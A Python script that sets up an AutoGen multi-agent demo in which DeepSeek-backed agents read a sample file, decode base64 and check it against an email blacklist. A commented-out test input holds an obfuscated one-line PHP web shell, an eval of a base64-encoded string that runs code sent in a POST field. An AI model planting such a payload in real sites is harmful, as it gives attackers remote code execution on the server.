import asyncio
import os
import sys
from typing import Sequence
from autogen_agentchat.agents import AssistantAgent
from autogen_agentchat.messages import BaseAgentEvent, BaseChatMessage, TextMessage, UserMessage
from autogen_agentchat.teams import SelectorGroupChat
from autogen_agentchat.conditions import TextMentionTermination
from autogen_core import CancellationToken
from autogen_ext.models.openai import OpenAIChatCompletionClient
from autogen_ext.tools.http import HttpTool
from autogen_core.tools import FunctionTool
from autogen_ext.agents.file_surfer import FileSurfer
import logging

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),  # 输出到控制台
        logging.FileHandler('multi_agent_mcp.log')  # 输出到文件
    ]
)
logger = logging.getLogger(__name__)

# 创建 ChatCompletion 客户端
G_DEEPSEEK_KEY = os.environ.get('DPSK_KEY')
if not G_DEEPSEEK_KEY:
    logger.error("DPSK_KEY environment variable not set")
    sys.exit(1)

model_client = OpenAIChatCompletionClient(
    model="deepseek-chat",
    base_url="https://api.deepseek.com",
    api_key=G_DEEPSEEK_KEY,
    model_info={
        "vision": False,
        "function_calling": True,
        "structured_output": True,
        "json_output": True,
        "family": "unknown",
    },
)


# 定义 HttpTool 的 JSON Schema，用于 base64 解码
base64_schema = {
    "type": "object",
    "properties": {
        "value": {"type": "string", "description": "要解码的 base64 值"},
    },
    "required": ["value"],
}

# 创建 HttpTool，用于访问 httpbin.org 的 base64 解码 API
base64_tool = HttpTool(
    name="base64_decode",
    description="解码 base64 值的工具",
    scheme="https",
    host="httpbin.org",
    port=443,
    path="/base64/{value}",
    method="GET",
    json_schema=base64_schema,
    return_type="text",
)

# 创建一个本地文件用于 FileSurfer 读取
async def create_sample_file():
    sample_file_path = "sample.txt"
    with open(sample_file_path, "w") as f:
        # f.write("""
        #     <?php  
        #     $k = "password";  
        #     $f = "base64_decode";  
        #     $c = $f("ZXZhbCgkX1BPU1RbJ2MnXSk7");  
        #     @eval($c);  
        #     ?>"""
        # )
        f.write(f"Nzk5MDQ5MzcxQHFxLmNvbQ==")
    return sample_file_path


# 自定义 selector 函数，基于对话历史选择下一个发言者
# def selector_func(messages: Sequence[BaseAgentEvent | BaseChatMessage]) -> str | None:
#     if not messages:
#         return "http_agent"  # 初始发言者为 http_agent
#     last_message = messages[-1].to_text()
#     if "base64" in last_message.lower():
#         return "http_agent"  # 如果提到 base64，选择 http_agent
#     if "file" in last_message.lower() or "read" in last_message.lower():
#         return "file_agent"  # 如果提到 file 或 read，选择 file_agent
#     return None  # 否则让模型决定


# 创建文件读取工具
def file_read(file_path: str) -> str:
    """读取指定文件的内容"""
    if not file_path:
        return "Error: File path not provided."
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
        return content
    except FileNotFoundError:
        return f"Error: File '{file_path}' not found."
    except Exception as e:
        return f"Error reading file: {str(e)}"


# 使用 FunctionTool 包装文件读取函数
file_read_tool = FunctionTool(
    func=file_read,
    name="local_file_read",
    description="读取指定本地文件的内容",
)

def check_email_black(email_address: str) -> bool:
    if email_address == "799049371@qq.com":
        return True
    else:
        return False


# 使用 FunctionTool 包装文件读取函数
check_email_tool = FunctionTool(
    func=check_email_black,
    name="check_email_black",
    description="判断恶意黑名单邮件地址",
)

async def main():
    # 创建 HTTP 代理，配备 base64 解码工具
    # http_agent = AssistantAgent(
    #     name="http_agentt",
    #     model_client=model_client,
    #     tools=[base64_tool],
    #     description="一个处理 HTTP 请求的代理，能够解码 base64 值。",
    # )

    # 创建本地 read file 代理
    toolkit_agent = AssistantAgent(
        name="toolkit_agent",
        model_client=model_client,
        tools=[file_read_tool, base64_tool, check_email_tool],
        description="这是一个工具箱, 里面有: 读取本地文件, 解码base64, 判断黑名单邮件地址 等工具",
    )

    security_agent = AssistantAgent(
        name="security_analyst",
        model_client=model_client,
        description="评估项目安全性",
        system_message="""
            你负责根据漏洞扫描、配置安全性、访问控制等角度评估项目的安全。
            约束：请优先考虑使用 toolkit_agent 提供的能力。
        """
    )

    # 修改后的summary_agent定义
    summary_agent = AssistantAgent(
        name="summary_agent",
        model_client=model_client,
        description="生成任务汇总报告",
        system_message="""请根据以下规则生成任务总结报告：

        # 报告生成规则
        1. 对每个独立任务的结果单独列出
        2. 每个任务结果包含：
        - 任务类型/描述
        - 输入参数
        - 输出结果
        3. 保持结果数据的原始格式
        4. 使用Markdown格式组织报告

        # 输出示例格式
        ## [任务1描述]
        - 输入: [参数]
        - 输出: [原始结果]

        ## [任务2描述]
        - 输入: [参数]
        - 输出: [原始结果]

        最后发送TERMINATE""",
    )

    # 创建一个样本文件供 FileSurfer 读取
    sample_file_path = await create_sample_file()

    # 创建 SelectorGroupChat 团队
    termination = TextMentionTermination("TERMINATE")
    team = SelectorGroupChat(
        participants=[toolkit_agent, security_agent, summary_agent],
        model_client=model_client,
        allow_repeated_speaker=True,
        # selector_func=selector_func,
        termination_condition=termination,
        max_turns=10,
        # selector_prompt="你在一个角色扮演游戏中。可用的角色：\n{roles}\n请阅读以下对话历史，然后从 {participants} 中选择下一个发言的角色，仅返回角色名称。\n\n{history}\n\n请根据以上对话选择下一个发言角色，仅返回角色名称。",
    )

    # 运行团队，展示两个代理的能力
    print("=== SelectorGroupChat Demo 开始 ===")
    # 修改后的任务指令模板
    TASK_TEMPLATE = """请完成以下任务并生成报告：

    {task_list}

    # 报告要求
    1. 保持每个任务的原始输出
    2. 不要合并或修改实际任务结果
    3. 按任务执行顺序列出结果"""

    # 使用时动态生成任务指令
    def generate_task_instruction(tasks: list):
        task_items = "\n".join(f"{i+1}. {task}" for i, task in enumerate(tasks))
        return TASK_TEMPLATE.format(task_list=task_items)

    # 示例任务列表
    tasks = generate_task_instruction([
        f"评估文件 {sample_file_path} 是否包含黑名单邮件地址",
    ])
    
    stream = team.run_stream(task=tasks)
    async for event in stream:
        if isinstance(event, BaseChatMessage):
            print(f"{event.source}: {event.to_text()}")
        elif isinstance(event, dict) and "messages" in event:
            print(f"任务结果: {event}")

    # 清理：删除样本文件
    os.remove(sample_file_path)

# 运行 demo
if __name__ == "__main__":
    asyncio.run(main())


